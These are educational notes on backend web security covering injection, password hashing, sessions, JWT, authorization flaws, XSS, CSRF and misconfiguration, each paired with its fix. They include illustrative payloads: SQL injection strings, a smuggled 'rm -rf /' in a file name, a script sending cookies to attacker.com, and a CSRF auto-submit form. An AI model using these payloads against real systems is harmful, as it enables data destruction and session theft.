# 🔐 Backend Security — Complete In-Depth Notes

> **Goal of these notes:** Build a *paranoid mindset*. No application is ever "truly secure," but understanding *how* attackers think gives you the edge to prevent 99% of real-world vulnerabilities.

---

## 🧠 The Core Attacker Mindset

> **The single most important question an attacker asks:**
> **"Where did the developer make an assumption?"**

Developers build for the **happy path** — they assume:
- Users fill forms correctly
- Input is always clean
- Requests come only from their own frontend
- Nobody inspects the network tab

**Attackers do the opposite.** They poke every boundary, modify every parameter, and exploit every assumption.

### The Mental Model

Every vulnerability in this document comes down to **one fundamental thing**:

> **Data crossing a boundary between systems, languages, or privilege levels — and being treated as code instead of data.**

---

## 📚 Table of Contents

1. [Injection Attacks](#1-injection-attacks)
   - [SQL Injection](#11-sql-injection)
   - [Command Injection](#12-command-injection)
2. [Authentication Vulnerabilities](#2-authentication-vulnerabilities)
   - [Password Storage](#21-password-storage)
   - [Sessions & Cookies](#22-sessions--cookies)
   - [JWT (Stateless Auth)](#23-jwt-stateless-auth)
   - [Rate Limiting](#24-rate-limiting)
3. [Authorization Vulnerabilities](#3-authorization-vulnerabilities)
   - [BOLA — Broken Object Level Authorization](#31-bola--broken-object-level-authorization)
   - [BFLA — Broken Function Level Authorization](#32-bfla--broken-function-level-authorization)
   - [Indirect Object References](#33-indirect-object-references)
4. [Cross-Site Scripting (XSS)](#4-cross-site-scripting-xss)
5. [Cross-Site Request Forgery (CSRF)](#5-cross-site-request-forgery-csrf)
6. [Security Misconfiguration](#6-security-misconfiguration)
7. [Defense in Depth — The Layered Approach](#7-defense-in-depth--the-layered-approach)
8. [Resources](#8-resources)

---

## 1. Injection Attacks

### The Root Cause

Your backend speaks **multiple languages simultaneously**:

```
Browser ──► Backend ──► Database   (speaks SQL)
                   ──► OS          (speaks Shell)
                   ──► HTML/CSS    (speaks HTML)
```

**Each language has its own special characters and grammar.**

When **user input from one language crosses into another language's context**, those special characters can change meaning — turning *data* into *commands*.

> **Think of it like this:** You're writing a SQL query template in English, but the user sneaks in a word that means something else in SQL. Your query suddenly does something you never intended.

---

### 1.1 SQL Injection

#### How It Works

Suppose you have a login page. Your server builds this query:

```sql
SELECT * FROM users WHERE email = '<user_input>'
```

**Happy path** — User types `alice@gmail.com`:
```sql
SELECT * FROM users WHERE email = 'alice@gmail.com'
-- Returns Alice's row. ✅ Everything fine.
```

**Attack path** — Attacker types `' OR '1'='1' --`:
```sql
SELECT * FROM users WHERE email = '' OR '1'='1' --'
-- Returns ALL users! ❌
```

#### Why It Works — Breaking It Down

| Part | What It Does |
|------|-------------|
| `'` | Closes the first string quote, completing `email = ''` |
| `OR '1'='1'` | Always evaluates to TRUE |
| `--` | Comments out the rest of the query (no syntax error) |

Result: The WHERE clause becomes permanently TRUE → returns every row in the database.

#### Even More Destructive Version

Attacker types: `'; DROP TABLE users; --`

```sql
SELECT * FROM users WHERE email = ''; DROP TABLE users; --'
-- Deletes your entire users table! 💥
```

**Other things SQL injection can do:**
- Use `UNION` statements to extract data from *other* tables (e.g., payment info)
- Use database functions to **read files from your server**
- In some configs, **execute operating system commands**

#### The Fix — Parameterized Queries (Prepared Statements)

**Never do this (string concatenation):**
```javascript
// ❌ DANGEROUS
const query = "SELECT * FROM users WHERE email = '" + userInput + "'";
db.execute(query);
```

**Always do this (parameterized query):**
```javascript
// ✅ SAFE
const statement = "SELECT * FROM users WHERE email = $1";
db.execute(statement, [userInput]);
// OR in most ORMs:
db.query("SELECT * FROM users WHERE email = ?", [userInput]);
```

**Why parameterized queries are safe:**
- The query structure is sent to the database **separately** from the data
- The database treats the `$1` slot as **pure data, never as code**
- Even if the attacker passes `' OR '1'='1' --`, the database treats it as a literal string — it will just find no matching email

> **Key principle:** Separate **code** (the SQL template) from **data** (user input). Never mix them with string concatenation.

**Note on NoSQL (MongoDB):**
- MongoDB queries are JSON objects, not SQL strings
- Attackers can inject **operator objects** like `{ "$ne": null }` (not equal to null)
- **Always validate the shape of input**, not just its value
- Never pass raw user JSON directly to a database query

---

### 1.2 Command Injection

Same principle as SQL injection, but the target is your **operating system**.

#### Example Scenario

You have a web app that processes user-uploaded images using a CLI tool (e.g., FFmpeg):

```javascript
// ❌ DANGEROUS — building a shell command with string concatenation
const command = `ffmpeg -h 120 -w 220 -o ${userProvidedFilename}`;
exec(command);
```

**Happy path** — User provides `output.jpg`:
```bash
ffmpeg -h 120 -w 220 -o output.jpg  # ✅ Works fine
```

**Attack path** — User provides `output.jpg; rm -rf /`:
```bash
ffmpeg -h 120 -w 220 -o output.jpg; rm -rf /
# ❌ Deletes your entire root filesystem!
```

**Other creative attacks:**
- Use pipes `|` to redirect output to destructive commands
- Use `&` to run spyware commands in the background
- Every shell (bash, zsh, fish) has its own special characters and escape sequences

#### The Fix — Argument Arrays

Every major language provides functions that pass arguments **directly to the process** without going through a shell interpreter:

```javascript
// ❌ DANGEROUS — goes through shell, interprets special chars
exec(`ffmpeg -h 120 -w 220 -o ${userInput}`);

// ✅ SAFE — arguments passed directly to process
execFile('ffmpeg', ['-h', '120', '-w', '220', '-o', userInput]);
// Python equivalent:
// subprocess.run(['ffmpeg', '-h', '120', '-w', '220', '-o', user_input])
```

**Why this is safe:** The OS starts the process directly and passes `userInput` as a literal string argument. No shell ever sees it. Special characters like `;`, `|`, `&` have no meaning at this level.

---

### Injection Attack Summary

**The mental checklist for every piece of user input:**

> 1. Is this input being passed to another system (DB, OS, HTML)?
> 2. Does that system have its own language / grammar?
> 3. Am I using an API that separates the *structure* (code) from the *data*?

**Golden rule: Whenever you're building a string that will be *interpreted* by another system, and that string includes user input — STOP. Find the parameterized alternative.**

---

## 2. Authentication Vulnerabilities

> **Authentication** = Verifying *who* the user is (which row in your users table).

If you get this wrong, attackers can **impersonate users, access private data, and steal money**.

> **Pro tip:** Use a third-party auth provider (Clerk, Auth0, Supabase Auth) for production systems. They handle edge cases, social login, stateful sessions, and security patches 24/7. Only roll your own when you have millions of users and a dedicated security team.

---

### 2.1 Password Storage

#### Stage 1 — Plaintext (NEVER DO THIS)

```
DB: | email            | password  |
    | alice@gmail.com  | 12345     |  ← visible to anyone with DB access
```

**Problems:**
- DB breach = all passwords exposed immediately
- Your own developers and DBAs can see every user's password
- 70%+ of users reuse passwords across sites — one breach = account takeover everywhere

---

#### Stage 2 — Basic Hashing (Better, but not enough)

A **hash function** has three properties:
1. **Any input → fixed-length output** (e.g., always 64 characters)
2. **Same input → always same output** (deterministic)
3. **One-way** — mathematically impossible to reverse (can't get the password from the hash)

```
12345  →  [bcrypt]  →  $2b$10$abcxyz...   (stored in DB)
```

**On login:** Hash the provided password, compare with stored hash. ✅

**Problem — Rainbow Tables:**
Attackers precompute a massive table:
```
12345    →  $2b$10$hash_of_12345
password →  $2b$10$hash_of_password
...
```
If your DB is breached, they compare every stored hash against this table. Common passwords like `12345` or `password` will match immediately.

---

#### Stage 3 — Salted Hashing (The Standard)

**Salt** = a unique, randomly generated string for each user, stored alongside their hash.

```
Password: "12345"
Salt (random, unique per user): "xK9mP2..."
Hash: bcrypt("12345" + "xK9mP2...") → $2b$10$xK9mP...uniqueresult
```

```
DB: | email           | hashed_password      | salt     |
    | alice@gmail.com | $2b$10$xK9mP...      | xK9mP2.. |
```

**Why it defeats rainbow tables:** The attacker's table has the hash of `"12345"`, but your DB has the hash of `"12345xK9mP2..."`. These will **never match**. Every user's hash is unique even if they have the same password.

**On login:**
1. Fetch the user's stored salt
2. Hash `providedPassword + storedSalt`
3. Compare with stored hash

---

#### Stage 4 — Slow Hashing Algorithms (Against Brute Force)

**Problem:** Modern GPUs can compute **billions of SHA-256 hashes per second**. With a breached DB + salt, an attacker can still brute-force by trying billions of password guesses per second.

**Solution:** Use **slow hashing functions** designed specifically for passwords.

| Algorithm | Speed | Recommended? |
|-----------|-------|-------------|
| MD5 | Billions/sec | ❌ Never for passwords |
| SHA-256 | Billions/sec | ❌ Never for passwords |
| bcrypt | ~100/sec per GPU | ✅ Acceptable |
| scrypt | ~10/sec per GPU | ✅ Good |
| **Argon2id** | Configurable | ✅ **Current industry standard** |

**The cost factor / work factor:** You can configure how slow the hash is.

```javascript
// Example: bcrypt with cost factor 12
const hash = await bcrypt.hash(password, 12); // takes ~250ms

// For Argon2id (recommended):
const hash = await argon2.hash(password, {
  type: argon2.argon2id,
  memoryCost: 65536, // 64MB RAM required (makes GPU attacks expensive)
  timeCost: 3,       // 3 iterations
  parallelism: 4,
});
```

**The math on why this works:**
- Genuine user login: 400ms → imperceptible to the human
- Attacker brute-forcing: Drops from **1 billion attempts/sec** → **~4 attempts/sec**
- Cracking an 8-char password: Days → **Centuries**

> **Remember: Argon2id is the current industry gold standard. Use it.**

---

### 2.2 Sessions & Cookies

After login, the user is authenticated. We need to *remember* them for subsequent requests without making them log in every time.

#### How Sessions Work

**Step 1: Generate a session ID**
```javascript
// Must be cryptographically secure random string
// 128-256 bits of randomness
const sessionId = crypto.randomBytes(32).toString('hex'); // 64 hex chars
```

**Step 2: Store session data in DB / Redis**
```javascript
// Store in Redis (fast) or your DB
redis.set(`session:${sessionId}`, JSON.stringify({
  userId: user.id,
  createdAt: Date.now(),
  expiresAt: Date.now() + 7 * 24 * 60 * 60 * 1000, // 7 days
  ipAddress: req.ip,
  userAgent: req.headers['user-agent'],
}));
```

**Step 3: Send session ID to browser as a cookie**
```http
Set-Cookie: session_id=abc123...; HttpOnly; Secure; SameSite=Strict; Max-Age=604800
```

**On each subsequent request:** Server extracts `session_id` from cookie → looks up in Redis → identifies the user.

---

#### Critical Cookie Flags

**`HttpOnly`**
```
Set-Cookie: session_id=abc123; HttpOnly
```
- **Prevents JavaScript from reading the cookie**
- `document.cookie` cannot access it
- Protects against XSS attacks stealing the session token
- **Always set this for session/auth cookies**

---

**`Secure`**
```
Set-Cookie: session_id=abc123; Secure
```
- Cookie is **only sent over HTTPS**, never HTTP
- Prevents session hijacking on public Wi-Fi / man-in-the-middle attacks
- **Always set this in production**

---

**`SameSite`**
```
Set-Cookie: session_id=abc123; SameSite=Strict
```
Controls when cookies are sent in cross-origin requests:

| Value | Behavior | Use When |
|-------|----------|----------|
| `Strict` | Cookie only sent from your own site | **Best** — use for auth cookies |
| `Lax` | Sent for top-level navigations, not for images/iframes | Frontend & backend on different domains |
| `None` | Sent everywhere — requires `Secure` flag | ❌ Avoid for auth cookies |

**Why this matters:** Prevents CSRF attacks (covered in Section 5).

> **Modern browsers default to `SameSite=Lax`** — but always set it explicitly.

---

### 2.3 JWT (Stateless Auth)

An alternative to sessions where the **session data is stored in the token itself** (client-side) instead of the server/database.

#### Structure of a JWT

```
header.payload.signature
  ↓        ↓          ↓
eyJhbGc.eyJ1c2VyS.SflKxwR   ← base64url encoded
```

**Header** — algorithm info:
```json
{ "alg": "HS256", "typ": "JWT" }
```

**Payload** — the claims (user data):
```json
{
  "sub": "user_id_12345",    // subject (user ID)
  "iat": 1718000000,         // issued at timestamp
  "exp": 1718003600,         // expires at
  "name": "Alice",
  "isAdmin": false
}
```

**Signature** — tamper-proof seal:
```
HMACSHA256(
  base64url(header) + "." + base64url(payload),
  SECRET_KEY   ← stored in your env variables, never in code
)
```

**Why you can't tamper with the payload:**
The payload is just Base64 encoded (not encrypted — anyone can decode it). But if you modify the payload and re-encode it, the **signature won't match** the new payload. The server will reject it.

```
Modified payload → Signature verification FAILS → 401 Unauthorized
```

#### JWT vs Sessions

| Feature | Sessions (Stateful) | JWT (Stateless) |
|---------|--------------------|--------------| 
| Storage | Server-side (DB/Redis) | Client-side (cookie/localStorage) |
| Revocation | Easy — delete from DB | Hard — token valid until expiry |
| Scaling | Needs shared Redis | No server state needed |
| Complexity | Simpler | More complex edge cases |

#### The Big Problem with JWTs — Revocation

**With sessions:** To log out a user from all devices:
```javascript
// One DB call, instant effect
db.delete(`WHERE user_id = ${userId}`);
```

**With JWTs:** You can't force-expire a token. If someone's account is compromised, the attacker's token stays valid until it expires.

**Workarounds:**

1. **Token Blacklist** — Store revoked tokens in Redis with their expiry
   ```javascript
   redis.set(`blacklist:${tokenId}`, true, { EX: tokenExpirySeconds });
   // Check on every request — partially defeats the point of stateless auth
   ```

2. **Short expiry + Refresh Tokens** (most common pattern):
   ```
   Access Token:  expires in 5–15 minutes
   Refresh Token: expires in 1–7 days
   ```
   - Requests use the short-lived access token
   - When access token expires (401), use refresh token to get a new access token
   - Compromise window is limited to the access token TTL (5–15 mins)

#### JWT Storage — Where to Keep It

| Location | XSS Risk | CSRF Risk | Recommended? |
|----------|----------|-----------|-------------|
| `localStorage` | ❌ High (JS can read it) | ✅ Safe | ❌ No |
| Cookie without `HttpOnly` | ❌ High | ❌ Risk | ❌ No |
| **`HttpOnly` Cookie** | ✅ Safe | ✅ Safe (with `SameSite`) | ✅ **Yes** |
| Memory (JS variable) | ✅ Safe | ✅ Safe | ✅ OK but lost on refresh |

> **Bottom line:** Always store JWTs in `HttpOnly` cookies. If you do this, you've basically rebuilt sessions — which is why **sessions are generally preferred** unless you have specific scaling requirements that demand stateless auth.

#### Security Warning — Payload is NOT Encrypted

```javascript
// Anyone can decode the payload — it's just Base64
atob("eyJ1c2VySWQiOiIxMjM0NSIsImlzQWRtaW4iOnRydWV9")
// → { "userId": "12345", "isAdmin": true }
```

**Never store sensitive data in JWT payload** (passwords, PII, credit card info). Only store what the server needs for routing decisions (user ID, role).

---

### 2.4 Rate Limiting

Without rate limiting, attackers can send **millions of password guesses per minute** to your login endpoint.

#### Layered Rate Limiting Strategy

**Layer 1: Per-IP Limiting**
```
Max 10 login attempts per IP per minute
```
- Stops basic automated attacks
- **Weakness:** Attackers use botnets / rotating proxies / VPNs with different IPs

**Layer 2: Per-Account Limiting**
```
Max 5 failed attempts per account per 15 minutes
→ Lock account for 24 hours (or until user resets)
```
- Stops attacks targeting one specific account
- **Weakness:** Attackers try one password across *thousands* of accounts (credential stuffing)

**Layer 3: Global Rate Limiting**
```
Max 100 failed login attempts system-wide per minute
→ Raise alert, trigger CAPTCHA, auto-block suspicious IPs
```
- The last resort — catches attacks that evade layers 1 and 2

> **Apply stricter rate limits on auth endpoints than on general API endpoints.**

**Additional measures:**
- CAPTCHA after N failed attempts
- Email alerts to users after suspicious login activity
- Multi-factor authentication (MFA)

---

## 3. Authorization Vulnerabilities

> **Authorization** = Verifying *what* the authenticated user is allowed to do.
>
> Authentication asks: "Who are you?"  
> Authorization asks: "What are you allowed to do?"

**The classic mistake:** Checking authorization only at the routing layer, then forgetting about it at the database query layer.

---

### 3.1 BOLA — Broken Object Level Authorization

> Also known as **IDOR (Insecure Direct Object Reference)**

#### The Vulnerability

You have an endpoint:
```
GET /invoices?id=5
```

Your routing layer correctly checks:
- ✅ Is the user authenticated? (valid session cookie)
- ✅ Does the user have `read:invoices` permission?

Your service layer then does:
```sql
-- ❌ WRONG — fetches ANY invoice regardless of ownership
SELECT * FROM invoices WHERE id = 5;
```

The attacker changes `id=5` to `id=6`, `id=7`... and downloads **every invoice in your system**, even ones belonging to other users.

This is the **most common API vulnerability** in the real world.

#### The Fix — Database-Level Authorization

```sql
-- ✅ CORRECT — only returns the invoice if it belongs to the current user
SELECT * FROM invoices
WHERE id = 5
AND user_id = $currentUserId;  -- extracted from the authenticated session
```

**Important detail — Return 404, not 403:**

```javascript
// ❌ BAD — leaks information
const invoice = await db.findById(5);
if (invoice.userId !== currentUser.id) {
  return res.status(403).json({ error: "Forbidden" }); // Confirms invoice #5 EXISTS
}

// ✅ GOOD — no information leakage
const invoice = await db.findOne({
  id: 5,
  userId: currentUser.id  // combined query
});
if (!invoice) {
  return res.status(404).json({ error: "Not found" }); // Attacker can't tell if it exists
}
```

**Why 404 instead of 403?**
- A 403 tells the attacker: *"This resource exists, but it's not yours"*
- An attacker can loop through all IDs and map out every invoice in your system
- They can then use social engineering to target those specific accounts
- 404 gives zero information: *"Does it not exist, or is it not yours? You'll never know."*

#### BOLA applies to ALL database operations

```javascript
// ❌ WRONG — any of these without ownership check
db.findById(id)
db.update({ id }, data)
db.delete({ id })

// ✅ CORRECT — always add ownership filter
db.findOne({ id, userId: currentUser.id })
db.update({ id, userId: currentUser.id }, data)
db.delete({ id, userId: currentUser.id })
```

---

### 3.2 BFLA — Broken Function Level Authorization

While BOLA is about accessing **another user's data** (horizontal), BFLA is about accessing **admin-level functions** (vertical escalation).

#### The Vulnerability

An admin panel endpoint exists:
```
GET /admin/invoices  ← Returns ALL invoices from ALL users
```

You "protected" it by just keeping the URL secret — **security through obscurity**. There's no actual admin role check.

A regular user discovers the URL (through network traffic inspection, guessing, source code), calls it, and gets every invoice in your system.

#### The Fix — Role-Based Middleware

```javascript
// Router setup
router.get('/admin/invoices',
  requireAuth,           // Layer 1: Is user logged in?
  requireRole('admin'),  // Layer 2: Does user have ADMIN role?
  invoiceController.listAll
);

// The middleware
function requireRole(role) {
  return (req, res, next) => {
    if (req.user.role !== role) {
      return res.status(403).json({ error: 'Forbidden' });
    }
    next();
  };
}
```

**Security through obscurity is NOT security.** Hidden URLs, unlisted endpoints, and "nobody knows this exists" are all false safety. One network sniff, one insider, one accidental log entry — and it's over.

---

### 3.3 Indirect Object References

Using **sequential integer IDs** in URLs is predictable and exploitable:
```
/invoices/101  → /invoices/102  → /invoices/103  → ...
```

An attacker can enumerate every resource in your system.

**Fix:** Use **UUIDs** as primary keys:
```
/invoices/550e8400-e29b-41d4-a716-446655440000  ← unpredictable
```

```sql
-- PostgreSQL example
CREATE TABLE invoices (
  id UUID DEFAULT gen_random_uuid() PRIMARY KEY,
  user_id UUID NOT NULL,
  ...
);
```

> **Caveat:** UUIDs can have slight performance implications on indexed columns. Read up on `UUID v7` (time-ordered UUIDs) as a middle ground.

---

### Authorization Mental Model

```
HORIZONTAL attack (BOLA/IDOR):
  User A ──────────────────► User B's data
  (same privilege level, different user)

VERTICAL attack (BFLA):
  Regular User
       │
       ▼ escalates to
  Admin Functions
  (same user, higher privilege level)
```

### Authorization Best Practices Checklist

- **Centralize authorization logic** — One auth layer, not scattered checks throughout the codebase
- **Default deny** — If your logic doesn't *explicitly* allow something, block it. New routes are protected by default.
- **Verify at the point of access** — Check auth at the *database query*, not just at the router
- **Use 404 not 403** — for resource-level auth failures (no information leakage)
- **Write automated tests** for auth scenarios:
  - User A cannot access User B's resources
  - Regular user cannot call admin functions
  - Unauthenticated user cannot access authenticated routes
- **Audit logs** — Log every access to sensitive endpoints and every authorization failure

---

## 4. Cross-Site Scripting (XSS)

### What Is XSS?

**XSS occurs when an attacker's JavaScript code executes in a legitimate user's browser, in the context of your platform.**

Once malicious JS runs in a victim's browser, it can:
- **Read everything on the page** (form values, displayed data)
- **Steal session cookies** (if not `HttpOnly`)
- **Make API requests** impersonating the logged-in user
- **Redirect to phishing pages** to capture credentials
- **Modify page content** to show fake data

### Type 1 — Stored XSS (Most Dangerous)

A malicious script is **stored in your database** and served to every user who views that content.

**Example — Comment system on a blog:**

1. Attacker submits a comment:
   ```html
   Great post! <script>
     fetch('https://attacker.com/steal?cookie=' + document.cookie);
   </script>
   ```

2. Your server stores this as-is in the database.

3. Every user who loads the blog post now executes the attacker's script.

4. The script sends the victim's session cookie to the attacker's server.

5. Attacker hijacks every victim's session. 💀

**Why it happened:** The server took user input and injected it into the HTML DOM without sanitization.

In React, this looks like:
```jsx
// ❌ DANGEROUS — React warns you with the name!
<div dangerouslySetInnerHTML={{ __html: userComment }} />
```

### Type 2 — Reflected XSS

The script is embedded in a URL and reflected back in the response:
```
https://yoursite.com/search?q=<script>alert(document.cookie)</script>
```
If your server renders this query parameter directly in the HTML without escaping, the script executes.

### Type 3 — DOM-Based XSS

JavaScript on your own page reads a URL parameter or storage value and writes it directly to the DOM:
```javascript
// ❌ DANGEROUS
document.getElementById('greeting').innerHTML = location.hash.slice(1);
// URL: https://yoursite.com/page#<img src=x onerror=alert(1)>
```

---

### The Fix — Two Layers of Defense

**Layer 1: Input Sanitization (Primary Defense)**

Before storing user-provided HTML/markdown in your database, sanitize it:

```javascript
// Using DOMPurify (Node.js server-side)
const DOMPurify = require('isomorphic-dompurify');

const cleanHTML = DOMPurify.sanitize(userInput, {
  ALLOWED_TAGS: ['p', 'b', 'i', 'em', 'strong', 'a', 'ul', 'li'],
  ALLOWED_ATTR: ['href'],
  // Script tags, event handlers, etc. are stripped
});
await db.save({ comment: cleanHTML });
```

What sanitization removes:
- `<script>` tags
- `onerror=`, `onclick=`, and other event handlers
- `javascript:` URLs
- Anything that could execute code

---

**Layer 2: Content Security Policy (CSP) Headers — Last Line of Defense**

CSP tells the browser exactly which scripts it is allowed to execute:

```
Content-Security-Policy: 
  default-src 'self';
  script-src 'self' https://trusted-cdn.com;
  style-src 'self';
  img-src 'self' data:;
  object-src 'none'
```

**What this does:**
- `script-src 'self'` — Only execute scripts from your own domain
- Inline scripts (like injected `<script>` tags) are **blocked by default**
- Even if an attacker injects a `<script>` tag, the browser refuses to run it

```html
<!-- This would be BLOCKED by a strict CSP: -->
<script>steal(document.cookie)</script>
<!-- Error: Refused to execute inline script because it violates CSP -->
```

> **CSP is not a replacement for sanitization.** Sanitize first. Use CSP as insurance in case a sanitization edge case is missed.

---

### XSS Root Cause (Same As Injection)

> **User-provided data being treated as code rather than data.**  
> This time it happens in the browser (HTML/JS) rather than on the server (SQL/Shell).

---

## 5. Cross-Site Request Forgery (CSRF)

### What Is It?

An attacker tricks your user's browser into making an **authenticated request to your server** from a **different website**.

**Example — Banking Scenario:**

1. User logs into `bank.com` — browser stores `bank.com` session cookie
2. User visits `evil.com` (via phishing link)
3. `evil.com` has a hidden auto-submitting form:
   ```html
   <form action="https://bank.com/transfer" method="POST">
     <input name="to" value="attacker_account">
     <input name="amount" value="10000">
   </form>
   <script>document.forms[0].submit();</script>
   ```
4. The user's browser sends the request to `bank.com` — **including the session cookie**
5. `bank.com` sees a valid session cookie and processes the transfer

### Why It's Less of a Threat Today

Modern defenses make CSRF largely a legacy problem:

**Defense 1: `SameSite` Cookie Flag (Default in Modern Browsers)**
```
Set-Cookie: session_id=abc123; SameSite=Lax
```
- `Lax` (browser default): Cookie not sent for cross-origin requests triggered by images, iframes, or form POSTs from other sites
- `Strict`: Cookie *never* sent from cross-origin requests

**Defense 2: CORS (Cross-Origin Resource Sharing)**
Your backend only allows requests from your own frontend's origin:
```javascript
app.use(cors({
  origin: 'https://yourapp.com',  // Only your frontend
  credentials: true,
}));
```
Browsers block cross-origin requests that aren't explicitly allowed.

**When to still worry about it:** Legacy apps using old browser behavior, `SameSite=None` cookies, or APIs designed to be called from external sites.

---

## 6. Security Misconfiguration

### 6.1 Secrets Management

**Never commit secrets to version control.**

```bash
# ❌ NEVER DO THIS — committed to git
const DB_PASSWORD = "super_secret_password_123";
const JWT_SECRET = "my-jwt-secret";
const API_KEY = "sk-prod-abc123...";
```

Even if you delete it later, it's **still in git history forever**:
```bash
git log --all -S "password"  # Attackers can find it
```

**✅ Do this instead:**
```bash
# .env file (never commit this — add to .gitignore)
DB_PASSWORD=super_secret_password_123
JWT_SECRET=my-jwt-secret

# In code:
const dbPassword = process.env.DB_PASSWORD;
```

For production, use secret managers:
- AWS Secrets Manager / AWS Parameter Store
- HashiCorp Vault
- GCP Secret Manager
- Azure Key Vault

**If you accidentally commit a secret:**
1. **Immediately rotate/revoke the secret** — delete and generate a new one
2. The old one is compromised; deleting the commit is not enough
3. Audit logs for any unauthorized access using the leaked secret

---

### 6.2 Debug Mode in Production

**Never run debug logging in production.**

In development with `LOG_LEVEL=debug`:
```
[DEBUG] Executing SQL: SELECT * FROM users WHERE email = 'alice@gmail.com' AND password_hash = '$2b$...'
[DEBUG] DB connection pool: { host: 'db.internal', user: 'app_user', password: 'dbpassword123' }
[DEBUG] Stack trace: Error at /app/src/handlers/auth.js:42 in verifyPassword()
[DEBUG] User object: { id: 5, email: 'alice@gmail.com', role: 'admin', ssn: '123-45-6789' }
```

If this appears in production logs that get breached, the attacker now knows:
- Your database structure
- Your code structure (stack traces)
- Your database credentials
- User PII (sensitive fields)

**✅ Production should always use `LOG_LEVEL=info` (or higher):**
```
[INFO] User alice@gmail.com logged in successfully
[INFO] Request processed: POST /api/login 200 245ms
```

---

### 6.3 Security Headers

Most modern frameworks provide security middleware with one line:

**Node.js/Express — Helmet:**
```javascript
const helmet = require('helmet');
app.use(helmet()); // Sets all recommended security headers automatically
```

**Go — Secure middleware:**
```go
import "github.com/unrolled/secure"
secureMiddleware := secure.New(secure.Options{
  BrowserXssFilter:   true,
  ContentTypeNosniff: true,
  FrameDeny:          true,
})
```

**Key headers it sets:**

| Header | Purpose |
|--------|---------|
| `X-Frame-Options: DENY` | Prevents your site from being embedded in an iframe (blocks clickjacking) |
| `X-Content-Type-Options: nosniff` | Prevents browser from guessing content type |
| `Strict-Transport-Security` | Forces HTTPS for all future visits |
| `Content-Security-Policy` | Controls what scripts/resources can execute |
| `X-XSS-Protection` | Legacy XSS filter in older browsers |

**Clickjacking** (why `X-Frame-Options` matters): An attacker embeds your legitimate banking site inside a transparent iframe over their own evil.com page. The user thinks they're clicking on evil.com, but they're actually clicking buttons on the invisible bank.com iframe.

---

## 7. Defense in Depth — The Layered Approach

**No single defense is perfect.** Use multiple layers so an attacker must bypass ALL of them.

```
Request comes in
       │
       ▼
┌─────────────────────────────────────────┐
│ Layer 1: INPUT VALIDATION               │
│ Validate every field: type, format,     │
│ length, allowed values. Reject early.   │
└─────────────────────────────────────────┘
       │
       ▼
┌─────────────────────────────────────────┐
│ Layer 2: PARAMETERIZED OPERATIONS       │
│ Use prepared statements for DB queries. │
│ Use argument arrays for OS commands.    │
└─────────────────────────────────────────┘
       │
       ▼
┌─────────────────────────────────────────┐
│ Layer 3: AUTHENTICATION CHECK           │
│ Verify identity (session/JWT).          │
│ Applied at the routing layer.           │
└─────────────────────────────────────────┘
       │
       ▼
┌─────────────────────────────────────────┐
│ Layer 4: AUTHORIZATION CHECK            │
│ Verify permissions at routing layer.    │
│ Re-verify ownership at DB query level.  │
└─────────────────────────────────────────┘
       │
       ▼
┌─────────────────────────────────────────┐
│ Layer 5: SECURITY HEADERS + CSP         │
│ Browser-level protection.               │
│ Last line of defense if above fails.    │
└─────────────────────────────────────────┘
       │
       ▼
┌─────────────────────────────────────────┐
│ Layer 6: MONITORING + AUDIT LOGS        │
│ Detect ongoing attacks.                 │
│ Alert on anomalies.                     │
│ Forensic trail for incidents.           │
└─────────────────────────────────────────┘
```

### The Three Questions to Ask for Every Line of Code

> 1. **Where is data crossing a boundary?** (User → DB, User → OS, User → HTML)
> 2. **What assumptions am I making about this data?**
> 3. **What if those assumptions are wrong?**

If you ask these three questions consistently, you will catch 99% of vulnerabilities before they ship.

---

## 8. Resources

### PortSwigger Web Security Academy
**https://portswigger.net/web-security**

- Free, comprehensive, hands-on labs
- Covers all topics in these notes + much more (SSRF, XXE, OAuth attacks, etc.)
- The creators of Burp Suite — the industry-standard penetration testing tool
- Highly recommended for building real attack/defense intuition

### OWASP Top 10
**https://owasp.org/www-project-top-ten/**

The authoritative list of the most critical web application security risks, updated every few years.

Current Top 10 (most relevant to backend):
1. **Broken Access Control** (BOLA + BFLA — covered in Section 3)
2. **Cryptographic Failures** (Password storage — covered in Section 2.1)
3. **Injection** (SQL + Command injection — covered in Section 1)
4. **Security Misconfiguration** (covered in Section 6)
5. **Vulnerable Components** — Keep dependencies updated
6. **Identification & Authentication Failures** (covered in Section 2)
7. **Security Logging & Monitoring Failures** (covered in Section 7)

### OWASP Cheat Sheet Series
**https://cheatsheetseries.owasp.org/**

Concise, actionable best practices for specific topics:
- [Authentication Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html)
- [Session Management Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html)
- [SQL Injection Prevention](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
- [XSS Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)

### Lucia Auth (Authentication Guidance)
**https://lucia-auth.com**

No longer an auth library — now a guide for implementing authentication correctly with industry best practices. Excellent reference for session management, password hashing, and token handling.

---

## 🧩 Quick Reference Cheat Sheet

### Vulnerabilities At a Glance

| Vulnerability | Root Cause | Fix |
|--------------|-----------|-----|
| SQL Injection | User input mixed into SQL string | Parameterized queries |
| Command Injection | User input mixed into shell command | Argument arrays |
| Weak password storage | Reversible/fast hashing | Argon2id with salt |
| Session hijacking | Cookie accessible to JS | `HttpOnly` + `Secure` + `SameSite` cookies |
| JWT revocation | Stateless tokens can't be invalidated | Short expiry + refresh tokens / use sessions |
| BOLA (IDOR) | No ownership check at DB query level | Add `AND user_id = $currentUser` to every query |
| BFLA | No role check on admin endpoints | `requireRole('admin')` middleware |
| XSS | User HTML rendered without sanitization | Sanitize input + Content Security Policy |
| CSRF | Cross-origin requests include cookies | `SameSite=Strict/Lax` cookie flag |
| Secret leakage | Secrets in source code | Environment variables + secret managers |

---

*These notes were compiled from a backend security deep-dive covering: Injection attacks, Authentication, Authorization, XSS, CSRF, and Security Misconfiguration. For deeper learning, see PortSwigger Academy and OWASP resources above.*
